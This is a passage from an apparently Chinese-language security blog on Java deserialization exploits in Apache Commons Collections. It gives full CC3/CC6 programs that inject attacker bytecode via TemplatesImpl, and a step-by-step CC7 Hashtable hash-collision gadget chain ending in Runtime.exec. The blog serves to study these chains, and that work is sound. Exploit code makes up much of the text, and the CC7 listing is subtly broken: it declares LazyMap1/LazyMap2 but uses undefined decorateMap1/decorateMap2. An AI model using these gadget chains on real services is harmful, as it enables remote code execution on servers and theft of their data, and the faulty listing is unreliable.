class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>         <span class="hljs-comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC1</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlerConstructor.newInstance(Target.class, lazyMap);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Override.class, mapProxy);<br><br><br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC6实现CC3完整版"><a href="#CC6实现CC3完整版" class="headerlink" title="CC6实现CC3完整版"></a>CC6实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<br>       <span class="hljs-comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br>		<br>        <span class="hljs-comment">// 在 put 之后通过反射修改值  </span><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="">java安全漫谈-Java中动态加载字节码的那些方法</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d195054a6a081ba07486dcc86c6ba707">类的动态加载</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC7</title>
    <url>/2024/06/04/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC7/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC7本质上也是对CC1的改写，走到了万恶之源LazyMap最终导致反序列化。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC7.png" alt="CC7"></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><code>散列函数(哈希函数)</code>中心思想：</p>
<ul>
<li>不同参数返回不同哈希值</li>
<li>相同参数返回相同哈希值</li>
</ul>
<p>比如我输入葡萄返回10，输入西瓜返回3，下次输入西瓜还是返回3</p>
<p>(传入不同参数时，哈希值一定都不相同么？事实上任何算法在理论上都不能保证。这种参数不同结果相同的情况学名叫做“Hash冲突(Hash碰撞)”，CC7就利用了这个小技巧)</p>
<p>在遇到 hash 碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞。 在这之中使用的是父类 <code>AbstractMap</code> 的 <code>equals()</code> 方法。	</p>
<p>那<code>散列函数(哈希函数)</code>有什么意义呢？我们可以利用哈希值的特性，设计一张全新的表结构—-<code>散列表(哈希表 HashTable)</code></p>
<p><code>散列表（哈希表 HashTable）</code>，是根据关键码值(Key value)而直接进行访问的数据结构。</p>
<p>也就是说，它通过把关键码值,映射到表中一个位置来访问记录，这个映射函数叫做 散列函数(哈希函数)，存放记录的数组叫做散列表。<br>散列表(哈希表 HashTable)是由数组+链表实现的—-散列表底层保存在一个数组中，数组的索引由散列表的 <code>key.hashCode()</code>经过计算得到， 数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603225326444.png" alt="image-20240603225326444"></p>
<h3 id="HashMap继承关系"><a href="#HashMap继承关系" class="headerlink" title="HashMap继承关系"></a>HashMap继承关系</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160518210.png" alt="image-20240603160518210"></p>
<p>如上图所示<code>HashMap</code> 是<code>AbstractMap</code>的实现类， 同时这二者实现Map接口。</p>
<p>HashMap中没有实现Map接口的equals()方法，父类AbstractMapMap实现了equals()方法</p>
<h3 id="LazyMap继承关系"><a href="#LazyMap继承关系" class="headerlink" title="LazyMap继承关系"></a>LazyMap继承关系</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160438448.png" alt="image-20240603160438448"></p>
<p>LazyMap是AbstractMapDecorator的实现类同时这二者实现Map接口。</p>
<p>LazyMap中没有实现equals()方法，父类AbstractMapDecorator实现了equals()方法</p>
<p>(如果一个类实现了一个接口，那么该类必须实现接口中声明的所有方法，如果一个抽象类实现了一个接口，它可以选择不实现接口的所有方法，而把实现的责任交给它的具体子类)</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>猜想作者是受了CC6的启发，既然HashMap能实现反序列化漏洞，那HashTable是否也可以？最终是形成了CC7这条链。</p>
<hr>
<p><code>Hashtable</code>的<code>readObject()</code>调用了<code>reconstitutionPut()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">  table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>        threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>        count = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>            <br>首先创建一个Entry，这是上文讲到的散列表中的那个数组。<br>s是我们传入的输入流<br>然后进入<span class="hljs-keyword">for</span>循环反序列化赋值给 key,value，然后调用reconstitutionPut方法。<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155212582.png" alt="image-20240603155212582"></p>
<p>继续跟进 <code>reconstitutionPut()</code> 方法，之后我们看到 <code>reconstitutionPut()</code> 方法调用了 <code>equals()</code> 方法—-<code>e.key.equals(key)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <br><span class="hljs-comment">//通过key计算一个hash值，用这个值进行计算得到index。这个index就是前面创建的Entry数组的索引。</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>     <br><span class="hljs-comment">//比较哈希值e.hash是否与新键的哈希值hash相等。如果哈希值相等，再比较键 e.key 是否与新键 key 相等。如果两个条件都满足，则表示哈希表中已存在相同的键，抛出 StreamCorruptedException 异常。</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br><br>e.key.equals(key)其中两个key有什么不同？<br>e.key：这是当前哈希表（table）中某个位置（index）已存在的键。e是一个 Entry 对象，表示哈希表中一个槽位的链表中的一个节点。所以，e.key 是已经存储在哈希表中的键。<br>key：这是从反序列化输入流（ObjectInputStream）中读取的新键。这个键是在反序列化过程中从流中读取的，并且需要插入到哈希表中。<br><br>其中e.key可控，是因为在反序列化过程中，键和值是直接从输入流中读取的<br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155307188.png" alt="image-20240603155307188"></p>
<p>所以要看一下哪里有<code>equals()</code> 这个方法，找到了 <code>AbstractMapDecorator</code> 这个类中对map调用了equals()方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155442086.png" alt="image-20240603155442086"></p>
<p><code>return map.equals(object)</code>中map是什么？这里只是<code>AbstractMapDecorator</code> 中定义了一个名为 <code>map</code> 的字段，存储对另一个 <code>Map</code> 对象的引用。</p>
<p>这个类是继承了 Map 接口，但是 Map 是一个接口，我们需要去找 Map 的实现类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160438813.png" alt="image-20240604160438813"></p>
<p>上面最开始就说了AbstractMap实现了Map接口，并且实现了equals()方法</p>
<p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap.get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160036081.png" alt="image-20240604160036081"></p>
<p>调用链</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span>.get<br></code></pre></td></tr></table></figure>



<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(LazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(LazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="为什么需要创建两个HashMap"><a href="#为什么需要创建两个HashMap" class="headerlink" title="为什么需要创建两个HashMap"></a>为什么需要创建两个HashMap</h3><p>如果两个hashmap相同的话会直接在<code>hashtable.put()</code>的时候认为是一个元素，所以之后就不会在反序列化的时候触发equals代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604202356973.png" alt="image-20240604202356973"></p>
<h3 id="为什么需要创建两个LazyMap"><a href="#为什么需要创建两个LazyMap" class="headerlink" title="为什么需要创建两个LazyMap"></a>为什么需要创建两个LazyMap</h3><p>首先看<code>HashTable.put</code>，这里和<code>reconstitutionPut</code>处的代码类似，都包含了<code>*.key.equals(key))</code>代码。其中<code>key</code>是传入的<code>LazyMap</code>，<code>tab</code>是全局的一个<code>Entry</code>，根据<code>hashcode</code>算出一个<code>index</code>，只有<code>entry</code>中有元素才会进入<code>for</code>循环，从而进一步触发</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604205642784.png" alt="image-20240604205642784"></p>
<p>所以可以看出，必须要两个或以上元素才能进入<code>entry.key.equals(key))</code>方法。类似地，反序列化的触发点<code>reconstitutionPut</code>处也是这样的逻辑，需要保证必须有两个或以上元素</p>
<p>进而可以得出的结论，能走到<code>LazyMap.get</code>方法的只有<code>lazyMap2</code>这一个对象</p>
<h3 id="为什么选择zZ和yy作为key"><a href="#为什么选择zZ和yy作为key" class="headerlink" title="为什么选择zZ和yy作为key"></a>为什么选择zZ和yy作为key</h3><p>if中的第一个条件就是<code>e.hash == hash</code>，意思就是两个key的hash必须相同。那为什么不把两个key设成一样的呢？这样两个key的hash绝对相等的啊。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204417711.png" alt="image-20240604204417711"></p>
<p>但是如果继续往下跟代码的话就会发现在<code>lazymap</code>的get方法中有以下逻辑，map的key不能重复否则就不会执行<code>transform</code>函数执行代码了。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204650378.png" alt="image-20240604204650378"></p>
<h3 id="为什么Hashtable需要-put-两次"><a href="#为什么Hashtable需要-put-两次" class="headerlink" title="为什么Hashtable需要 put 两次"></a>为什么Hashtable需要 put 两次</h3><p>在<code>Hashtable.reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604203934450.png" alt="image-20240604203934450"></p>
<p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code> elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204034934.png" alt="image-20240604204034934"></p>
<h3 id="为什么要移除第二个LazyMap中的元素"><a href="#为什么要移除第二个LazyMap中的元素" class="headerlink" title="为什么要移除第二个LazyMap中的元素"></a>为什么要移除第二个LazyMap中的元素</h3><ul>
<li>为什么最后要<code>remove(&quot;yy&quot;)</code></li>
</ul>
<p>问题在<code>AbstractMap.equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210421463.png" alt="image-20240604210421463"></p>
<ul>
<li>为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</li>
</ul>
<p>在<code>Hashtable.put()</code>方法时也会调用一次<code>entry.key.equals(key)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210702264.png" alt="image-20240604210702264"></p>
<p>因此在<code>hashtable.put(decorateMap2, 2);</code>之后跟到<code>AbstractMap().equals()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604221340356.png" alt="image-20240604221340356"></p>
<p>这里可以看到，传入<code>LazyMap.get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap.get()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604212136853.png" alt="image-20240604212136853"></p>
